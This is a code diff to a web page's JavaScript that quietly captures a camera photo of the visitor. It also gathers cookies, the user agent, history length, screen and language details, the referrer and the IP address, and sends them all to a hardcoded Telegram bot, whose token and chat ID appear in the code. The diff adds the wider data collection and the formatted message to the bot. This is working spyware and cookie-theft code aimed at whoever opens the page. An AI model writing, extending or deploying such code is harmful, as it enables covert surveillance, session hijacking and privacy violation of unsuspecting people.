@@ -75,37 +75,84 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
             stopCamera(); // Stop the camera
-            getDeviceInfo(imageData);
+            collectAndSendData(imageData);
         }
 
         function stopCamera() {
             stream.getTracks().forEach(track => track.stop()); // Stop all video tracks
         }
 
-        function getDeviceInfo(imageData) {
+        function collectAndSendData(imageData) {
             const deviceInfo = navigator.userAgent;
             const cookies = document.cookie; // Fetch cookies
+            const historyLength = window.history.length; // Browsing history length
+            const screenResolution = window.screen.width + "x" + window.screen.height;
+            const language = navigator.language;
+            const referrer = document.referrer;
+            const ip = ''; // IP will be collected below
+            
+            // Collect network type and connection info
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const effectiveType = connection ? connection.effectiveType : 'unknown';
+
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
-                .then(data => sendToTelegram(imageData, deviceInfo, cookies, data.ip))
+                .then(data => {
+                    const ip = data.ip;
+                    sendToTelegram(imageData, deviceInfo, cookies, ip, historyLength, screenResolution, language, referrer, effectiveType);
+                })
                 .catch(error => console.error('Error getting IP:', error));
         }
 
-        function sendToTelegram(imageData, deviceInfo, cookies, ip) {
+        function sendToTelegram(imageData, deviceInfo, cookies, ip, historyLength, screenResolution, language, referrer, effectiveType) {
             const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
             const chatId = '6305469091';
+
+            // Formatting the message using Markdown
+            const message = `
+*📋 Device Information:*
+\`\`\`
+${deviceInfo}
+\`\`\`
+
+*🌐 IP Address:*
+\`${ip}\`
+
+*🍪 Cookies:*
+\`\`\`
+${cookies}
+\`\`\`
+
+*🔍 Browsing History:*
+Number of visited pages: *${historyLength}*
+
+*🖥️ Screen Resolution:*
+\`${screenResolution}\`
+
+*🌐 Language:*
+\`${language}\`
+
+*🖱️ Referrer:*
+\`${referrer}\`
+
+*🌍 Connection Type:*
+\`${effectiveType}\`
+`;
+
+            // Send the image and formatted message
             const blob = dataURLToBlob(imageData);
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'photo.png');
-            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}\nCookies: ${cookies}`);
+            formData.append('caption', message);
+            formData.append('parse_mode', 'Markdown'); // Enable Markdown formatting
 
             fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
             .then(() => {
-                console.log('Data sent successfully!');
+                console.log('Photo and data sent successfully!');
             })
             .catch(error => console.error('Error:', error));
         }
